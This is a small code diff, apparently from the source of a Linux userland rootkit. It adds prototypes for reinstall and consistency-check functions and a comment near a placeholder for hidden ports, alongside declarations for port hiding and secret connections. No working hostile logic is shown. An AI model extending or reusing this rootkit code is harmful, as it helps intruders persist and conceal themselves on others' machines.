@@ -7,6 +7,8 @@
 #include "files/files.h"
 
 #ifdef DO_REINSTALL
+int rknomore(void);
+int ld_inconsistent(void);
 void reinstall(void);
 #include "reinstall.c"
 #endif
@@ -26,6 +28,7 @@ FILE *forge_numamaps(const char *pathname);
 #endif
 
 #ifdef HIDE_PORTS
+// this is replaced by the hideports path.
 #define HIDEPORTS "??HIDEPORTS??" // [HIDE_PORTS]
 int is_hidden_port(int port);
 int secret_connection(char line[]);
